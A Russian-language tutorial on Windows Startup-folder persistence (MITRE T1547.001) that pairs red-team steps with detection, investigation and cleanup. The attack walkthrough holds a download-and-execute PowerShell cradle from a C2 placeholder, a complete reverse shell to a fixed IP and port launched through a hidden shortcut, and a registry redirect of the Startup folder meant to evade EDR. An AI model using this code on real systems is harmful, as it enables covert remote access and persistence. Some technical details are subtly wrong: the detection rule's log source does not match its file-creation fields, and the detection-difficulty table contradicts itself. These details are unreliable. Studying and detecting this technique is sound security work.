# Startup-папка пользователя и её злоупотребление для persistence

## Контекст и базовые понятия

Startup-папка пользователя (User Startup Folder) представляет собой специализированный каталог в файловой системе Windows, который операционная система автоматически сканирует при инициализации пользовательского сеанса. Любые исполняемые файлы, скрипты или ярлыки, размещенные в этом каталоге, запускаются с правами текущего пользователя без необходимости явного взаимодействия с ним. Данный механизм является частью более широкой подсистемы автозагрузки (Auto-Start Execution), реализованной для обеспечения удобства пользователей и автоматизации фоновых задач (синхронизация облачных хранилищ, запуск антивирусных агентов, инициализация драйверов оборудования).

В контексте информационной безопасности и тестирования на проникновение (Red Teaming) этот механизм классифицируется как техника **T1547.001** (Registry Run Keys / Startup Folder) в матрице MITRE ATT&CK. Злоупотребление startup-папкой относится к тактике **Persistence** (Закрепление), так как позволяет атакующему сохранять доступ к скомпрометированной системе после перезагрузки или выхода пользователя из сеанса.

Ключевое разграничение необходимо проводить между различными механизмами автозагрузки, так как они различаются по уровню привилегий, области видимости и методам обнаружения.

### Разграничение механизмов автозагрузки Windows

| Механизм | Область действия | Уровень привилегий запуска | Путь по умолчанию (иллюстративная схема) | Особенности обнаружения |
| :--- | :--- | :--- | :--- | :--- |
| **User Startup Folder** | Текущий пользователь | Права пользователя | `C:\Users\<User>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup` | Низкая сложность обнаружения; часто игнорируется EDR-системами при мониторинге только системных ключей. |
| **System Startup Folder** | Все пользователи | Права пользователя (но с доступом к системным ресурсам) | `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp` | Средняя сложность; требует мониторинга записи в `ProgramData`. |
| **Registry Run Keys (HKCU)** | Текущий пользователь | Права пользователя | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` | Высокая сложность; стандартный объект мониторинга для большинства EDR. |
| **Registry Run Keys (HKLM)** | Все пользователи | Права пользователя (но с доступом к системным ресурсам) | `HKLM\Software\Microsoft\Windows\CurrentVersion\Run` | Высокая сложность; требует прав администратора для модификации. |
| **Scheduled Tasks** | Пользователь/Система | Зависит от конфигурации | `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks` | Высокая сложность; требует анализа дескрипторов безопасности и триггеров. |
| **Winlogon Userinit** | Все пользователи | Права пользователя | `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit` | Средняя сложность; изменение влияет на весь процесс входа в систему. |

Startup-папка пользователя имеет специфическую особенность: она находится в профиле пользователя, который может быть перемещен или скопирован (например, при миграции профиля или использовании Roaming Profiles). Однако в современных корпоративных средах (Active Directory) профили часто локальны, что делает путь `%APPDATA%\...\Startup` стабильным индикатором компрометации для конкретного хоста.

В отличие от реестра, где запись представляет собой строковое значение (REG_SZ) или массив строк (REG_MULTI_SZ), в startup-папке физически присутствует файл. Это создает дополнительный вектор для аналитики: необходимо отслеживать не только факт создания файла, но и его происхождение (процесс-родитель, цифровая подпись, хеш).

### Технические требования и ограничения

Для успешного использования startup-папки для persistence требуются следующие условия:
1.  **Доступ на запись:** Атакующий должен иметь права на создание файлов в целевой директории. Для пользовательской папки достаточно прав обычного пользователя.
2.  **Исполняемость:** Файл должен быть либо исполняемым (`.exe`, `.bat`, `.cmd`, `.ps1`), либо ассоциирован с приложением, поддерживающим автоматический запуск (например, `.lnk` для ярлыков, `.reg` для импорта ключей реестра).
3.  **Отсутствие блокировки антивирусом:** Файл должен пройти эвристический анализ. Злоумышленники часто используют техники обхода (obfuscation), такие как упаковка (packing), шифрование payload или легитимные загрузчики (например, `cmd.exe /c start ...`).

Важно отметить, что startup-папка пользователя не требует прав администратора, что делает её привлекательной для атак типа "Low-Privilege Persistence". Если атакующий уже получил доступ к учетной записи пользователя (через фишинг, кражу пароля или эксплуатацию уязвимости), он может установить persistence без повышения привилегий, что снижает риск срабатывания механизмов контроля целостности (UAC).

## Внутреннее устройство предмета

Startup-папка пользователя является частью иерархии профилей пользователей Windows. Путь формируется динамически на основе переменных окружения. Понимание структуры этого пути и смежных механизмов конфигурации критично для как эксплуатации, так и детектирования.

### Структура путей и переменных окружения

Путь к startup-папке текущего пользователя формируется из переменной `%APPDATA%`, которая указывает на `C:\Users\<Username>\AppData\Roaming`. Полное абсолютное значение:

```text
C:\Users\<Username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

Для всех пользователей (System-wide) используется переменная `%PROGRAMDATA%`:

```text
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
```

Операционная система считывает эти пути из реестра. Ключи, определяющие расположение папок, находятся в:
*   `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
*   `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`

Атакующие могут модифицировать эти ключи реестра, чтобы перенаправить запуск программ в другую директорию, обходя мониторинг стандартного пути. Это техника обхода (Evasion), часто используемая в связке с T1547.001.

### Механизм загрузки и исполнения

При инициализации сеанса пользователя (после успешной аутентификации в Winlogon), оболочка Windows Explorer (или процесс `explorer.exe`) выполняет следующие шаги:
1.  Загружает конфигурацию пользователя из реестра.
2.  Определяет список папок автозагрузки (Startup folders) для текущего профиля.
3.  Сканирует каждую папку на наличие файлов с расширениями, ассоциированными с исполняемыми действиями (по умолчанию: `.exe`, `.bat`, `.cmd`, `.com`, `.pif`, `.scr`, `.lnk`, `.url`).
4.  Для каждого найденного файла создается новый процесс.
5.  Процесс наследует токены доступа текущего пользователя.

Важно: порядок исполнения файлов в startup-папке не гарантирован и зависит от файловой системы (NTFS обычно сортирует по имени, но это не стандарт). Это может влиять на логику работы вредоносного ПО, если оно зависит от состояния других процессов.

### Сравнительный анализ методов реализации persistence в Startup

| Метод реализации | Формат артефакта | Преимущества для атакующего | Недостатки / Риски |
| :--- | :--- | :--- | :--- |
| **Прямое размещение EXE** | Файл `payload.exe` | Простота, надежность, отсутствие зависимостей. | Легко обнаруживается антивирусами по хешу. Требует обфускации имени. |
| **Ярлык (LNK)** | Файл `update.lnk` | Маскировка под легитимное обновление. Поддержка параметров запуска. | Может быть заблокирован политиками безопасности. Требует анализа целевого пути. |
| **Скрипт (BAT/CMD)** | Файл `syscheck.bat` | Простота написания, возможность выполнения сложных команд. | Легко анализируется. Оставляет следы в логах событийной подсистемы (Event ID 4688). |
| **PowerShell-скрипт** | Файл `config.ps1` | Мощный арсенал, возможность обхода Execution Policy (через параметры запуска). | Требует наличия PowerShell. Может быть заблокирован AMSI (Antimalware Scan Interface). |
| **Модификация реестра** | Ключ `HKCU\...\Run` с путем к файлу | Файл может быть спрятан в любой директории, не только в Startup. | Требует мониторинга изменений реестра. Путь к файлу может быть длинным и подозрительным. |

### Индикаторы компрометации (IoC) и аномалии

При анализе startup-папки специалисты по безопасности обращают внимание на следующие аномалии:
1.  **Новые файлы:** Появление файлов с расширениями `.exe`, `.ps1`, `.vbs` в папке, где ранее их не было.
2.  **Подозрительные имена:** Имена файлов, имитирующие легитимные процессы (например, `svchost_update.exe`, `chrome_helper.bat`).
3.  **Необычные владельцы:** Файлы, созданные процессами, не имеющими права на запись в `AppData` (например, `iexplore.exe` или `winword.exe`), что может указывать на эксплуатацию уязвимости.
4.  **Отсутствие цифровой подписи:** Легитимные программы автозагрузки часто подписаны. Отсутствие подписи или подпись от неизвестного издателя — красный флаг.
5.  **Модификация путей реестра:** Изменение значений `User Shell Folders` указывает на попытку перенаправления загрузки.

## Применение и работа с предметом

На практике работа с startup-папкой включает два направления: легитимное администрирование (установка ПО, настройка окружения) и исследовательское/тестовое использование (Red Teaming, форензика). В контексте тестирования на проникновение важно понимать не только как установить persistence, но и как его обнаружить и удалить.

### Легитимное использование и администрирование

Администраторы используют startup-папку для развертывания скриптов инициализации. Например, для настройки сетевого окружения или запуска мониторинговых агентов.

```powershell
# Пример легитимного добавления скрипта в startup текущего пользователя
# Требует прав пользователя, но не администратора

$StartupPath = [Environment]::GetFolderPath("Startup")
$ScriptPath = Join-Path $StartupPath "init_network.ps1"

# Создание скрипта (иллюстративная схема)
$ScriptContent = @"
# Инициализация сетевого окружения
Write-Host "Setting up network environment..."
# Здесь могут быть команды netsh, ipconfig и т.д.
"@

Set-Content -Path $ScriptPath -Value $ScriptContent -Force
Write-Host "Script added to startup: $ScriptPath"
```

В корпоративной среде прямое использование startup-папки пользователя часто ограничивается групповыми политиками (GPO). Политики могут запрещать выполнение скриптов из пользовательских профилей или перенаправлять их в системные каталоги.

### Исследовательское использование (Red Teaming)

При тестировании на проникновение атакующий может использовать startup-папку для установки бэкдора. Выбор этого метода обусловлен низким уровнем привилегий и высокой надежностью.

#### Шаг 1: Подготовка payload

Атакующий создает исполняемый файл или скрипт, который обеспечивает обратное соединение (reverse shell) или устанавливает новую учетную запись.

```powershell
# Пример создания PowerShell-скрипта для persistence
# В реальном сценарии payload будет зашифрован или обфусцирован

$Payload = @"
IEX (New-Object Net.WebClient).DownloadString('http://<C2_SERVER>/payload.ps1')
"@

$StartupDir = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$FileName = "update.ps1"
$FilePath = Join-Path $StartupDir $FileName

# Запись payload
Set-Content -Path $FilePath -Value $Payload -Encoding ASCII
Write-Host "Persistence established at: $FilePath"
```

#### Шаг 2: Обход детектирования

Простое размещение файла может быть обнаружено EDR-системой при мониторинге создания файлов. Для обхода используются техники:
*   **Маскировка имени:** Использование имен, похожих на системные (`svchost.exe`, `explorer.exe`).
*   **Использование легитимных загрузчиков:** Запуск PowerShell через `cmd.exe` с параметрами, минимизирующими следы в логах.
*   **Модификация путей реестра:** Перенаправление загрузки в другую папку, не мониторимую EDR.

```powershell
# Пример модификации пути реестра для обхода мониторинга
# Внимание: Этот код является иллюстративным и демонстрирует технику обхода

$RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders"
$StartupKey = "Startup"
$NewPath = "C:\Users\$env:USERNAME\AppData\Local\Temp\.hidden_startup"

# Создание новой директории
New-Item -ItemType Directory -Force -Path $NewPath

# Изменение реестра
Set-ItemProperty -Path $RegPath -Name $StartupKey -Value $NewPath
```

### Детектирование и расследование

Для обнаружения злоупотребления startup-папкой используются следующие методы:

1.  **Мониторинг создания файлов:** EDR-системы должны отслеживать создание исполняемых файлов в директориях `%APPDATA%\...\Startup` и `%PROGRAMDATA%\...\Startup`.
2.  **Анализ реестра:** Мониторинг изменений в ключах `User Shell Folders` и `Run`.
3.  **Сравнение с базой:** Сравнение содержимого startup-папки с эталонным образом системы (Golden Image).

```yaml
# Пример правила детектирования (Elastic/Sigma формат)
# Иллюстративная схема структуры правила

rule:
  name: Suspicious File Creation in User Startup Folder
  id: 12345
  level: medium
  description: Detects creation of executable files in the user startup folder.
  logsource:
    category: process_creation
    product: windows
  detection:
    selection:
      Image:
        - 'cmd.exe'
        - 'powershell.exe'
        - 'wscript.exe'
      TargetFilename:
        - '*\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\*.exe'
        - '*\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\*.ps1'
    condition: selection
  falsepositives:
    - Legitimate software installation
    - User-installed applications
```

### Типичные ошибки и подводные камни

1.  **Игнорирование системной папки:** Атакующие могут использовать `C:\ProgramData\...\Startup` вместо пользовательской. Мониторинг должен охватывать обе директории.
2.  **Неучет ярлыков:** Ярлыки (`.lnk`) могут указывать на исполняемые файлы в других директориях. Анализ должен включать разбор целевого пути ярлыка.
3.  **Ложные срабатывания:** Легитимное ПО (например, облачные клиенты) может добавлять записи в startup. Необходима интеграция с базой доверенных приложений.
4.  **Перезагрузка:** Для активации persistence в startup требуется перезагрузка или выход/вход пользователя. Если система не перезагружалась, persistence может не сработать.

## Сквозной практический пример: Установка и обнаружение persistence через User Startup Folder

### Исходные условия
*   **Среда:** Windows 10/11 Enterprise, EDR-система с включенным мониторингом создания файлов и изменений реестра.
*   **Роль:** Red Teamer (имеет доступ к учетной записи пользователя с правами на выполнение скриптов).
*   **Цель:** Установить persistence, которое сработает при следующем входе пользователя, и продемонстрировать методы обнаружения.

### Шаг 1: Разведка и подготовка окружения

Атакующий определяет текущий путь к startup-папке и проверяет наличие существующих файлов.

```powershell
# Получение пути к startup-папке текущего пользователя
$StartupPath = [Environment]::GetFolderPath("Startup")
Write-Host "Target Startup Path: $StartupPath"

# Перечисление существующих файлов
Get-ChildItem -Path $StartupPath -Force | Select-Object Name, Length, LastWriteTime
```

**Ожидаемый вывод:**
```text
Target Startup Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

Name              Length LastWriteTime
----              ------ -------------
readme.txt        1024   2023-10-01 10:00:00
```

### Шаг 2: Создание и размещение payload

Атакующий создает PowerShell-скрипт, который выполняет обратное соединение (reverse shell) к C2-серверу, и размещает его в startup-папке.

```powershell
# Создание payload (иллюстративная схема обратного соединения)
$Payload = @"
# Скрытый запуск PowerShell
$Process = New-Object System.Diagnostics.Process
$Process.StartInfo.FileName = 'powershell.exe'
$Process.StartInfo.Arguments = '-WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Users\student\AppData\Local\Temp\helper.ps1'
$Process.StartInfo.UseShellExecute = $false
$Process.Start()
"@

# Создание вспомогательного скрипта в Temp (для обхода прямого мониторинга Startup)
$HelperPath = "C:\Users\student\AppData\Local\Temp\helper.ps1"
$HelperContent = @"
# Обратное соединение (иллюстративная схема)
$Socket = New-Object System.Net.Sockets.TcpClient('192.168.1.100', 4444);
$Stream = $Socket.GetStream();
[byte[]]$Bytes = 0..65535|%{0};
while(($i = $Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0){;
    $Data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($Bytes,0, $i);
    $sendback = (iex $Data 2>&1 | Out-String );
    $sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $Stream.Write($sendbyte,0,$sendbyte.Length);
    $Stream.Flush();
};
$Socket.Close();
"@

# Размещение helper-скрипта
Set-Content -Path $HelperPath -Value $HelperContent -Force

# Размещение ярлыка в Startup, который запускает helper
$ShortcutPath = Join-Path $StartupPath "update.lnk"
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($ShortcutPath)
$Shortcut.TargetPath = "powershell.exe"
$Shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File $HelperPath"
$Shortcut.Save()

Write-Host "Persistence installed via shortcut in Startup folder."
```

**Ожидаемый вывод:**
```text
Persistence installed via shortcut in Startup folder.
```

### Шаг 3: Обход базового мониторинга (опционально)

Для усложнения детектирования атакующий может изменить права доступа к файлу или использовать легитимные загрузчики. В данном примере используется ярлык, который маскирует запуск PowerShell.

### Шаг 4: Детектирование и расследование (Blue Team perspective)

Специалист по безопасности получает алерт от EDR о создании файла в startup-папке.

```powershell
# Команда для расследования: поиск новых файлов в startup
$StartupPath = [Environment]::GetFolderPath("Startup")
Get-ChildItem -Path $StartupPath -Force | Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-1) } | Format-List FullName, Length, LastWriteTime, Attributes
```

**Ожидаемый вывод (индикатор компрометации):**
```text
FullName    : C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\update.lnk
Length      : 2048
LastWriteTime : 2023-10-02 14:30:00
Attributes  : Archive, Hidden
```

Анализ ярлыка `update.lnk` показывает, что он указывает на `powershell.exe` с аргументами, запускающими скрипт из `AppData\Local\Temp`. Это является сильным индикатором компрометации.

### Шаг 5: Устранение угрозы

Удаление ярлыка и вспомогательного скрипта.

```powershell
# Удаление артефактов
Remove-Item -Path $ShortcutPath -Force
Remove-Item -Path $HelperPath -Force
Write-Host "Persistence artifacts removed."
```

**Ожидаемый вывод:**
```text
Persistence artifacts removed.
```

### Ожидаемый вывод примера

Данный пример демонстрирует полный цикл: от установки persistence через легитимный механизм (startup-папка) до его обнаружения и устранения. Он подчеркивает важность мониторинга не только исполняемых файлов, но и ярлыков, а также файлов в временных директориях, на которые они ссылаются.

## Аналитический вывод

Startup-папка пользователя является одним из наиболее эффективных и распространенных механизмов для обеспечения persistence в Windows-средах благодаря своей простоте, надежности и отсутствию необходимости в высоких привилегиях. Атакующие активно используют эту технику (T1547.001) в сочетании с другими методами обхода, такими как маскировка файлов, использование ярлыков и модификация путей реестра. Для специалистов по безопасности критически важно внедрить комплексный мониторинг, который включает не только стандартные ключи реестра, но и файловую систему в директориях `%APPDATA%` и `%PROGRAMDATA%`, а также анализ ярлыков и их целевых путей. Интеграция данных о создании файлов, изменениях реестра и процессах в единую аналитическую модель позволяет выявлять аномалии, связанные с злоупотреблением механизмами автозагрузки, и своевременно реагировать на инциденты.

## Источники

*   [MITRE ATT&CK: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder (T1547.001)](https://attack.mitre.org/techniques/T1547/001/)
*   [Microsoft Documentation: Run and RunOnce Registry Keys](https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys)
*   [Elastic Security: Startup Persistence by a Suspicious Process](https://www.elastic.co/guide/en/security/8.19/startup-persistence-by-a-suspicious-process.html)
*   [Cofense: Windows Persistence Explained: Techniques, Risks, and What Defenders Should Know](https://cofense.com/blog/windows-persistence-explained-techniques,-risks,-and-what-defenders-should-know)
*   [Picus Security: T1547 Boot or Logon Autostart Execution Technique Explained](https://www.picussecurity.com/resource/blog/t1547-boot-or-logon-autostart-execution-technique-explained)
*   [Nextron Systems: Detecting the Most Popular MITRE Persistence Method – Registry Run Keys / Startup Folder](https://www.nextron-systems.com/2025/07/29/detecting-the-most-popular-mitre-persistence-method-registry-run-keys-startup-folder/)
*   [Intel 471: Hunting for Persistence: Registry Run Keys / Startup Folder](https://www.intel471.com/blog/hunting-for-persistence-registry-run-keys-startup-folder)